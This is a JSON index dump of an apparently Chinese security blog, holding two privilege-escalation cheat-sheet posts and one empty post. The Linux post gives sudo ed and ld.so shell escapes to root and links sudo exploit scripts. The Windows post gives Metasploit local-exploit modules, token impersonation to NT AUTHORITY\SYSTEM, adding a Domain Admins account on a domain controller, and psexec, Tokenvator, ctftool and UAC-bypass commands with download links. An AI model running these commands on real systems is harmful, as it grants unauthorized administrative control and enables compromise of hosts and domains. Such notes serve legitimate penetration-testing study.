{"pages":[],"posts":[{"title":"权限提升-Linux常见提权方法、工具","text":"ed编辑器提权关键步骤：使用sudo运行ed编辑器(一般情况下使用sudo要输入当前用户密码) 12345test:~$ sudo ed!/bin/bashroot:~# iduid=0(root) gid=0(root) groups=0(root) sudo 注入工具：https://github.com/wsfengfan/blog/blob/master/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-sudo%E6%B3%A8%E5%85%A5.rar 1、exploit.sh 1234test:~$ sh exploit.shtest:~$ sudo -iroot:~# iduid=0(root) gid=0(root) groups=0(root) 2、exploit_v2.sh 1234test:~$ sh exploit_v2.shtest:~$ /tmp/sh -proot:~# iduid=0(root) gid=0(root) groups=0(root) 3、exploit_v3.sh 123test:~$ sh exploit_v3.shroot:~# iduid=0(root) gid=0(root) groups=0(root) sudo ld.so自己判断系统下的ld.so文件位置和版本，一般情况在 /lib 文件下 123test:~$ sudo /lib/x86_64-linux-gnu/ld-2.29.so /usr/bin/python -c 'import os;os.setuid(0);os.system(&quot;/bin/bash&quot;)'root:~# iduid=0(root) gid=0(root) groups=0(root)","link":"/2020/04/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E3%80%81%E5%B7%A5%E5%85%B7/"},{"title":"权限提升-Window常见提权方法、工具","text":"metasploit利用方法1、service_permissions 模块在该模块下选择您的session ID 1msf5 exploit(windows/local/service_permissions) &gt; set sesions 2 选择”AGGRESSIVE”选项，可以利用目标机器每一个缺陷服务进行提权 1msf5 exploit(windows/local/service_permissions) &gt; set AGGRESSIVE true 2、always_install_elevated 模块该方法只要禁止注册表键 AlwaysInstallElevated。就可以阻止攻击者通过MSI文件进行提权。 3、trusted_service_path 模块此提权很容易被中断，需要不断的通信 需要在进程结束之前将它迁移到其他进程中，可以使用“set AytoRunScript migrate -f”命令自动迁移 4、enum_unattend 模块 5、令牌窃取使用msf5 &gt; sessions -i 1命令，把获取的session会话变成meterpreter会话 123meterpreter&gt; use incognitometerpreter&gt; list_tokens -umeterpreter&gt; impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot; 6、添加域用户1234567meterpreter&gt;use incognitometerpreter&gt;add_user test password -h 192.168.128.139//在域控上添加账户meterpreter&gt;add_group_user &quot;Domain Admins&quot; test -h 192.168.128.139//将该账户加到域管理组 Psexec.exe incognito.exe Tokenvator.exe工具：https://github.com/wsfengfan/blog/blob/master/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-window.rar 12345678Psexec:C:\\temp&gt; psexec -s -i cmd.exeincognito:C:\\temp&gt; incognito.exe execute -c &quot;NT AUTHORITY\\SYSTEM&quot; cmd.exeTokenvator:C:\\temp&gt; Tokenvator.exe getsystem cmd.exe ctftool 提权工具：https://github.com/wsfengfan/blog/blob/master/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-window.rar 12c:\\&gt;ctftoolctf&gt; script .\\scripts\\ctf-consent-system.ctf Bypass-UAC.ps1工具：https://github.com/wsfengfan/blog/blob/master/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-window.rar","link":"/2020/04/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Window%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E3%80%81%E5%B7%A5%E5%85%B7/"},{"title":"命令执行-Empire建立监听器获取会话","text":"","link":"/2020/04/04/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Empire%E5%BB%BA%E7%AB%8B%E7%9B%91%E5%90%AC%E5%99%A8%E8%8E%B7%E5%8F%96%E4%BC%9A%E8%AF%9D/"}],"tags":[{"name":"权限提升","slug":"权限提升","link":"/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"}],"categories":[]}